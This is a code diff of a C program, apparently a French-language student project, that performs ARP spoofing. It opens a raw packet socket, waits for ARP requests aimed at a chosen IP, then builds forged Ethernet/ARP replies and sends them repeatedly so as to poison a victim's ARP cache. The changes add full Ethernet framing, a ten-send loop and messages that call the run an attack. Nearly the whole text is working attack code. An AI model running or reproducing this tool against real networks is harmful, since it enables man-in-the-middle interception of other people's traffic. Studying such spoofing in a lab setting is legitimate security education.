@@ -2,14 +2,16 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <linux/if_packet.h>
-#include <stdio.h>
-#include <arpa/inet.h>
 #include <ifaddrs.h>
 #include <signal.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <string.h>
 
 static int g_sock_raw = -1;
 
-/* Gestionnaire du signal SIGINT pour une sortie propre */
 void sigint_handler(int signum)
 {
     (void)signum;
@@ -19,7 +21,6 @@ void sigint_handler(int signum)
     exit(EXIT_SUCCESS);
 }
 
-/* Fonction pour détecter l'interface réseau active (non-loopback et UP) */
 char *get_active_interface(void)
 {
     struct ifaddrs *ifaddr, *ifa;
@@ -27,7 +28,6 @@ char *get_active_interface(void)
 
     if (getifaddrs(&ifaddr) == -1) {
         perror("getifaddrs");
-        // En cas d'erreur, retourne "eth0" par défaut
         strncpy(interface_name, "eth0", IFNAMSIZ - 1);
         interface_name[IFNAMSIZ - 1] = '\0';
         return interface_name;
@@ -36,7 +36,6 @@ char *get_active_interface(void)
     interface_name[0] = '\0';
     for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
         if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET) {
-            // Vérifie que l'interface est UP et n'est pas loopback
             if ((ifa->ifa_flags & IFF_UP) && !(ifa->ifa_flags & IFF_LOOPBACK)) {
                 strncpy(interface_name, ifa->ifa_name, IFNAMSIZ - 1);
                 interface_name[IFNAMSIZ - 1] = '\0';
@@ -58,53 +57,65 @@ void print_arp_packet(const t_arp_packet *arp_pkt)
     inet_ntop(AF_INET, arp_pkt->sender_ip, sender_ip, INET_ADDRSTRLEN);
     inet_ntop(AF_INET, arp_pkt->target_ip, target_ip, INET_ADDRSTRLEN);
 
-    printf("\n===== Paquet ARP Reçu =====\n");
+    printf("\n===== Paquet ARP =====\n");
     printf("Type matériel      : %hu\n", ntohs(arp_pkt->htype));
     printf("Type protocole     : 0x%04x\n", ntohs(arp_pkt->ptype));
     printf("Longueur MAC       : %u\n", arp_pkt->hlen);
     printf("Longueur IP        : %u\n", arp_pkt->plen);
     printf("Opcode             : %s (%hu)\n", 
-        (ntohs(arp_pkt->opcode) == ARPOP_REQUEST) ? "Requête" : "Réponse", 
-        ntohs(arp_pkt->opcode));
-
+           (ntohs(arp_pkt->opcode) == ARPOP_REQUEST) ? "Requête" : "Réponse", 
+           ntohs(arp_pkt->opcode));
     printf("Expéditeur MAC     : %02x:%02x:%02x:%02x:%02x:%02x\n",
-        arp_pkt->sender_mac[0], arp_pkt->sender_mac[1], arp_pkt->sender_mac[2], 
-        arp_pkt->sender_mac[3], arp_pkt->sender_mac[4], arp_pkt->sender_mac[5]);
-
+           arp_pkt->sender_mac[0], arp_pkt->sender_mac[1], arp_pkt->sender_mac[2], 
+           arp_pkt->sender_mac[3], arp_pkt->sender_mac[4], arp_pkt->sender_mac[5]);
     printf("Expéditeur IP      : %s\n", sender_ip);
-
     printf("Cible MAC          : %02x:%02x:%02x:%02x:%02x:%02x\n",
-        arp_pkt->target_mac[0], arp_pkt->target_mac[1], arp_pkt->target_mac[2], 
-        arp_pkt->target_mac[3], arp_pkt->target_mac[4], arp_pkt->target_mac[5]);
-
+           arp_pkt->target_mac[0], arp_pkt->target_mac[1], arp_pkt->target_mac[2], 
+           arp_pkt->target_mac[3], arp_pkt->target_mac[4], arp_pkt->target_mac[5]);
     printf("Cible IP           : %s\n", target_ip);
     printf("===========================\n\n");
 }
-ssize_t send_arp_reply(int sock_raw, const t_arp_packet *arp_reply, const char *iface)
+
+void print_ethernet_frame(const t_ethernet_frame *frame)
+{
+    printf("\n===== Trame Ethernet =====\n");
+    printf("Destination MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",
+           frame->dest_mac[0], frame->dest_mac[1], frame->dest_mac[2],
+           frame->dest_mac[3], frame->dest_mac[4], frame->dest_mac[5]);
+    printf("Source MAC      : %02x:%02x:%02x:%02x:%02x:%02x\n",
+           frame->src_mac[0], frame->src_mac[1], frame->src_mac[2],
+           frame->src_mac[3], frame->src_mac[4], frame->src_mac[5]);
+    printf("Ethertype       : 0x%04x\n", ntohs(frame->ethertype));
+    /* Affiche le paquet ARP contenu dans la trame */
+    print_arp_packet(&frame->arp);
+    printf("==========================\n\n");
+}
+
+ssize_t send_arp_frame(int sock_raw, const t_ethernet_frame *frame, const char *iface)
 {
     struct sockaddr_ll addr = {0};
     struct ifreq ifr = {0};
 
-    // Récupération de l'index de l'interface
     ft_strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
     if (ioctl(sock_raw, SIOCGIFINDEX, &ifr) == -1) {
         perror("ioctl SIOCGIFINDEX");
         return -1;
     }
-
     addr.sll_ifindex = ifr.ifr_ifindex;
     addr.sll_halen = ETH_ALEN;
+    ft_memcpy(addr.sll_addr, frame->dest_mac, ETH_ALEN);
 
-    // Pour l'envoi, l'adresse de destination doit être celle de la victime
-    ft_memcpy(addr.sll_addr, arp_reply->target_mac, ETH_ALEN);
+    /* Affichage de la trame qui va être envoyée */
+    print_ethernet_frame(frame);
 
-    printf("Paquet ARP à envoyer :\n");
-    print_arp_packet(arp_reply);
-
-    ssize_t sent_bytes = sendto(sock_raw, arp_reply, sizeof(t_arp_packet), 0,
+    ssize_t sent_bytes = sendto(sock_raw, frame, sizeof(t_ethernet_frame), 0,
                                 (struct sockaddr *)&addr, sizeof(addr));
     return sent_bytes;
 }
+
+
+
+
 
 int main(int argc, char *argv[])
 {
@@ -112,55 +123,58 @@ int main(int argc, char *argv[])
     ssize_t recv_len;
     t_arp_packet reponse;
 
-    /* Enregistrement du gestionnaire de SIGINT pour gérer Ctrl+C */
     signal(SIGINT, sigint_handler);
+
     if (!parsing_arg(argc, argv, &reponse))
         return EXIT_FAILURE;
+
     int sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-    if (sock_raw < 0)
-    {
-        fprintf(stderr, "Erreur lors de la création de la socket\n");
+    if (sock_raw < 0) {
+        perror("Erreur lors de la création de la socket");
         return EXIT_FAILURE;
     }
     g_sock_raw = sock_raw;
 
-    /* Détection automatique de l'interface active */
     char *iface = get_active_interface();
-    printf("[INFO] Found available interface: %s\n", iface);
+    printf("[INFO] Active interface: %s\n", iface);
 
+    printf("[INFO] En attente d'une requête ARP...\n");
     while (1)
     {
         recv_len = recvfrom(sock_raw, buffer, sizeof(buffer), 0, NULL, NULL);
-        if (recv_len < 0)
-        {
+        if (recv_len < 0) {
             perror("Erreur lors de la réception du paquet ARP");
             continue;
         }
-
-        if (recv_len < (ssize_t)(ETH_HLEN + sizeof(t_arp_packet)))
-        {
+        if (recv_len < (ssize_t)(ETH_HLEN + sizeof(t_arp_packet))) {
             fprintf(stderr, "Paquet reçu trop court (%ld octets)\n", recv_len);
             continue;
         }
 
         t_arp_packet *arp_pkt = (t_arp_packet *)(buffer + ETH_HLEN);
         print_arp_packet(arp_pkt);
-        print_arp_packet(&reponse);
 
-        if (get_arp_request(arp_pkt, argv[1]))
-        {
-            printf("[INFO] Envoi de la réponse ARP spoofée...\n");
-            if (send_arp_reply(sock_raw, &reponse, iface) < 0)
-            {
-                perror("Erreur envoi ARP spoofée");
-                close(sock_raw);
-                return EXIT_FAILURE;
+        if (get_arp_request(arp_pkt, argv[1])) {
+            printf("[INFO] Requête ARP détectée ciblant %s\n", argv[1]);
+
+            t_ethernet_frame frame;
+            memset(&frame, 0, sizeof(frame));
+            ft_memcpy(frame.dest_mac, reponse.target_mac, ETH_ALEN);
+            ft_memcpy(frame.src_mac, reponse.sender_mac, ETH_ALEN);
+            frame.ethertype = htons(ETH_P_ARP);
+            ft_memcpy(&frame.arp, &reponse, sizeof(t_arp_packet));
+            for (int i = 0; i < 10; i++) {
+                ssize_t sent = send_arp_frame(sock_raw, &frame, iface);
+                if (sent < 0) {
+                    perror("Erreur envoi de la trame ARP");
+                } else {
+                    printf("[INFO] Paquet ARP spoofé envoyé (%ld octets)\n", sent);
+                }
+                sleep(2);
             }
-            printf("[INFO] Réponse ARP envoyée avec succès.\n");
-            continue ;
+            printf("[INFO] Fin de l'attaque ARP spoofing. Exiting...\n");
         }
     }
     close(sock_raw);
-
     return EXIT_SUCCESS;
 }
